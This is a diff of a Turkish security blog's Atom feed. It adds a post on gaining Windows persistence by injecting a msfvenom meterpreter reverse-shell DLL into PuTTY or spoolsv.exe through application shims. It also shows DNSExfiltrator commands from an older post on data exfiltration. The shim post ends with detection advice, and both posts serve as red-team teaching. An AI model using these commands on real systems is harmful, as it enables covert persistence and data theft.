@@ -1,5 +1,83 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün | Personel homepage about of my Profession - siber güvenlik</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/siber-guvenlik.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2018-11-11T13:48:00+03:00</updated><entry><title>Data Exfiltration</title><link href="https://enesergun.net/data-exfiltration.html" rel="alternate"></link><published>2018-11-11T13:48:00+03:00</published><updated>2018-11-11T13:48:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-11-11:/data-exfiltration.html</id><summary type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün - siber güvenlik</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/siber-guvenlik.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2019-12-21T15:00:00+03:00</updated><subtitle>Personel homepage about of my Profession</subtitle><entry><title>Application Shimming Kullanarak Windows Sistemler Üzerinde Kalıcılık</title><link href="https://enesergun.net/application-shimming-kullanarak-windows-sistemler-uzerinde-kalicilik.html" rel="alternate"></link><published>2019-12-21T15:00:00+03:00</published><updated>2019-12-21T15:00:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-12-21:/application-shimming-kullanarak-windows-sistemler-uzerinde-kalicilik.html</id><summary type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
+&lt;p&gt;Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
+&lt;p&gt;Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana kaynakla aynı değildir. &lt;/p&gt;
+&lt;h2&gt;Shimming Nedir?&lt;/h2&gt;
+&lt;p&gt;Windows sistemler üzerinde bir uygulamanın her sistemde çalışabilmesi adına çeşitli ayarlar barındıran bir dosyadır. &lt;code&gt;SDB&lt;/code&gt; dosyası olarak sistemler üzerinde tutulmaktadır. Dosya format olarak XML dosya formatındadır. Bu sayede sistemler üzerinde admin veya geliştiriciler yüklü uygulamalar üzerinde &lt;code&gt;Uyumluluk&lt;/code&gt; sorunlarını düzeltebiliyor veya patchleyebiliyorlar diyebiliriz.&lt;/p&gt;
+&lt;p&gt;Örnek bir SDB Dosyası: &lt;a href="https://github.com/williballenthin/python-sdb"&gt;Python-SDB&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Microsoft bu sebeple bir geliştirici kiti yayınlamıştır. Bu geliştirici kitinin ismi kısaca ADK'dır(Asssesment and Deployment Kit). 
+&lt;a href="https://go.microsoft.com/fwlink/?linkid=2086042"&gt;ADK'yı indirmek İçin Tıklayın&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Biz bu SDB Dosyası ile Ne yapacağız?&lt;/h2&gt;
+&lt;p&gt;Yukarıda bahsetmiş olduğum &lt;code&gt;Uyumluluk&lt;/code&gt; problemi için bu SDB dosyaları içerisinde InjectDLL diye bir seçenek bulundurmaktadır. Bunun sebebi geliştiricler eğer eski bir windows versiyonunda çalışacak uygulama varsa bu sisteme uygun DLL dosyasını uygulamaya dahil etmesini gerektirdiğindendir.&lt;/p&gt;
+&lt;p&gt;Windows 10 sisteme bazı uygulamaların açılabilmesi için .Net Framework 4.5 ile birlikte Net Framework 3.5 yüklemek gibi düşünebiliriz. (Sadece örnektir, geriye dönük uyumluluğun anlaşılabilmesi için vs.)&lt;/p&gt;
+&lt;p&gt;İşte bu InjectDLL özelliği bizim kullancağımız şeydir. Eğer biz burada bir uygulamaya istediğimiz bir DLL'i enjekte(!) edebilirsek bu sistem üzerinde kalıcılığı sağlamış oluruz. Üstelik görsel herhangi bir uyarı olmadan. &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Defcon 23'de bu konuyu işleyen, gündeme getiren &lt;a href="https://twitter.com/secure_sean"&gt;Sean Pierce&lt;/a&gt;'in orjinal sunum/videosu için aşağıdaki linki kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=LOsesi3QkXY"&gt;Abusing Native Shims for Post Exploitation&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Uygun bir DLL Dosyası Hazırlamak&lt;/h2&gt;
+&lt;p&gt;Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. &lt;/p&gt;
+&lt;p&gt;MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f dll &amp;gt; pentestlab.dll
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek&lt;/h2&gt;
+&lt;p&gt;Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="Windows ADK" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-combatibility-administrator.png"&gt;&lt;/p&gt;
+&lt;p&gt;Örnek üzerinde Putty kullanılmış. Putty kullanılmasının nedeni ise sıkça kullanılan küçük bir uygulama olması ve sistem yöneticileri vs tarafından şüphe çekmeyen bir uygulama olmamasından dolayıdır. Kendisi bir clientdır.(SSH, Telnet etc.)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Putty DLL Inject" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-create-application-fix.png"&gt;&lt;/p&gt;
+&lt;p&gt;Aşağıdaki ekran görüntüsünde yukarıdaki ekranda next dedikten sonra InjectDLL seçeneğini seçiyoruz ve Next diyoruz.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll.png"&gt;&lt;/p&gt;
+&lt;p&gt;Burada açılan ekranda ise InjectDLL'in bizden parametre isteyen ekranı açılacaktır. Bu ekranda &lt;code&gt;Command Line&lt;/code&gt; kısmına biraz önce oluşturduğumuz DLL dosyasının konumunu veriyoruz.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Options for InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png"&gt;&lt;/p&gt;
+&lt;p&gt;İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir &lt;code&gt;sdb&lt;/code&gt; dosyasına sahibiz. Buradan sonraki kısım ise bu &lt;code&gt;sdb&lt;/code&gt; dosyasını sisteme eklemek.&lt;/p&gt;
+&lt;p&gt;Bunun için &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sdbinst olusturdugunuzsdb.sdb
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="SDB Install" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png"&gt;&lt;/p&gt;
+&lt;p&gt;Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. &lt;/p&gt;
+&lt;h2&gt;Arayüz Olmadan Enjekte Etmek&lt;/h2&gt;
+&lt;p&gt;Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde &lt;code&gt;spoolsv.exe&lt;/code&gt; dosyasına enjekte edilmiştir.&lt;/p&gt;
+&lt;h2&gt;Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?&lt;/h2&gt;
+&lt;p&gt;Sorunun kısa cevabı: Evet.
+Uzun cevap:&lt;/p&gt;
+&lt;p&gt;Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. &lt;/p&gt;
+&lt;p&gt;Bu klasöre ulaşmak için: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.&lt;/p&gt;
+&lt;h2&gt;Tespit etmek&lt;/h2&gt;
+&lt;p&gt;Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde &lt;code&gt;12&lt;/code&gt; event ID ile tetiklenecektir. &lt;/p&gt;
+&lt;p&gt;Registry konumları:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\&lt;/span&gt;
+&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Dosya konumu:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Daha detaylı bir bilgi almak için Sean Price'ın &lt;a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf"&gt;sunumunu&lt;/a&gt; kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;Okuduğum yazı:
+&lt;a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/"&gt;Persistence Application Shimming&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Yazı Sonu&lt;/h2&gt;
+&lt;p&gt;Konu nispeten eski bir konu fakat okuduğum kaynak yeni attığı için ben de çevirme ihtiyacı duydum o yüzden bu konuda bir eleştiri kabul etmeyeceğim :D Hoş kabul etsem de umurumda değil orası ayrı.&lt;/p&gt;
+&lt;p&gt;Bu yazıyı dün sabaha doğru yazdım ve planım yazı sonuna doğru kendi duygu/durum, ülkenin hali(Nolacak bu ülkenin hali yav?), arkadaşlık ilişkileri(Arkadaşlardan ziyade tanıdıklarım kavramı) gibi içimdeki bir çok şeyi yazı sonuna dökecektim fakat gerek olmadığını düşünüyorum. Yine bir klasik olarak şarkı ile bu yazının sonunu getirelim hem konuya, hem boşvermişliklere uygun olsun.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.youtube.com/watch?v=4eAQIXcvJ3A" title="Duygusal olmaya gerek yok"&gt;&lt;img alt="" src="http://img.youtube.com/vi/4eAQIXcvJ3A/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="siber güvenlik"></category><category term="Application Shimming"></category><category term="Red Team"></category><category term="Kırmızı Takım"></category><category term="Windows sistemlerde kalıcılık"></category><category term="Windows Pentest"></category><category term="Windows Kırmızı Takım"></category><category term="Windows Red Team"></category></entry><entry><title>Data Exfiltration</title><link href="https://enesergun.net/data-exfiltration.html" rel="alternate"></link><published>2018-11-11T13:48:00+03:00</published><updated>2018-11-11T13:48:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-11-11:/data-exfiltration.html</id><summary type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
 &lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
 &lt;p&gt;Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Data Exfiltration Nedir?&lt;/h2&gt;
 &lt;p&gt;Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.&lt;/p&gt;
@@ -42,9 +120,9 @@ Nedir DNS'in çalışma mantığı?&lt;/p&gt;
 &lt;p&gt;Server üzerinde 
 &lt;code&gt;dnsexfiltrator.py -d domain -p PAROLA&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Client üzerinde&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c:\DNSExfiltrator&amp;gt; powershell
-PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1
-PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;c:\DNSExfiltrator&amp;gt; powershell&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Import-Module .\Invoke-DNSExfiltrator.ps1&lt;/span&gt;
+&lt;span class="err"&gt;PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -61,4 +139,4 @@ PS c:\DNSExfiltrator&amp;gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com 
 &lt;p&gt;&lt;strong&gt;Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Bu yazı tamamen bilgilendirme amaçlıdır.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Her yazının sonunda olduğu gibi klasik bu yazının şarkısını paylaşıyorum. &lt;/p&gt;
-&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=DuDhiHSksaA"&gt;&lt;img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="data exfil"></category><category term="veri kaçırma"></category><category term="veri kaçırma yöntemleri"></category><category term="data exfiltration türkçe"></category><category term="veri güvenliği"></category></entry></feed>
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=DuDhiHSksaA"&gt;&lt;img alt="Beth Hart - Caught Out In The Rain" src="https://img.youtube.com/vi/DuDhiHSksaA/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="siber güvenlik"></category><category term="data exfil"></category><category term="veri kaçırma"></category><category term="veri kaçırma yöntemleri"></category><category term="data exfiltration türkçe"></category><category term="veri güvenliği"></category></entry></feed>
